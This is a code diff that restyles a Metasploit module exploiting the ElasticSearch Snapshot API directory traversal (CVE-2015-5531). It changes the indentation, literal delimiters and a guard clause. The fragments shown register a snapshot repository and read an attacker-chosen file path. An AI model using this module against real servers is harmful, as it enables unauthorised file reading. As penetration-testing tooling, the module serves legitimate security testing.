@@ -1,3 +1,4 @@
+# frozen_string_literal: true
 ##
 # This module requires Metasploit: http://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
@@ -13,25 +14,24 @@ class MetasploitModule < Msf::Auxiliary
 
   def initialize(info = {})
     super(update_info(info,
-      'Name'           => 'ElasticSearch Snapshot API Directory Traversal',
-      'Description'    => %q{
-        'This module exploits a directory traversal vulnerability in
-        ElasticSearch, allowing an attacker to read arbitrary files
-        with JVM process privileges, through the Snapshot API.'
-      },
-      'References'     =>
-        [
-          ['CVE', '2015-5531'],
-          ['PACKETSTORM', '132721']
-        ],
-      'Author'         =>
-        [
-          'Benjamin Smith', # Vulnerability Discovery
-          'Pedro Andujar <pandujar[at]segfault.es>', # Metasploit Module
-          'Jose A. Guasch <jaguasch[at]gmail.com>', # Metasploit Module
-        ],
-      'License'        => MSF_LICENSE
-    ))
+                      'Name'           => 'ElasticSearch Snapshot API Directory Traversal',
+                      'Description'    => %q(
+                        'This module exploits a directory traversal vulnerability in
+                        ElasticSearch, allowing an attacker to read arbitrary files
+                        with JVM process privileges, through the Snapshot API.'
+                      ),
+                      'References'     =>
+                        [
+                          ['CVE', '2015-5531'],
+                          ['PACKETSTORM', '132721']
+                        ],
+                      'Author'         =>
+                        [
+                          'Benjamin Smith', # Vulnerability Discovery
+                          'Pedro Andujar <pandujar[at]segfault.es>', # Metasploit Module
+                          'Jose A. Guasch <jaguasch[at]gmail.com>', # Metasploit Module
+                        ],
+                      'License'        => MSF_LICENSE))
 
     register_options(
       [
@@ -44,7 +44,7 @@ class MetasploitModule < Msf::Auxiliary
     deregister_options('RHOST')
   end
 
-  def check_host(ip)
+  def check_host(_ip)
     res1 = send_request_raw(
       'method' => 'POST',
       'uri'    => normalize_uri(target_uri.path, '_snapshot', 'pwn'),
@@ -92,10 +92,8 @@ class MetasploitModule < Msf::Auxiliary
     vprint_status("Checking if it's a vulnerable ElasticSearch")
 
     check_code = check_host(ip)
-    print_status("#{check_code.second}")
-    if check_host(ip) != Exploit::CheckCode::Appears
-      return
-    end
+    print_status(check_code.second.to_s)
+    return if check_host(ip) != Exploit::CheckCode::Appears
 
     filename = datastore['FILEPATH']
     filename = filename[1, filename.length] if filename =~ %r{/^\//}
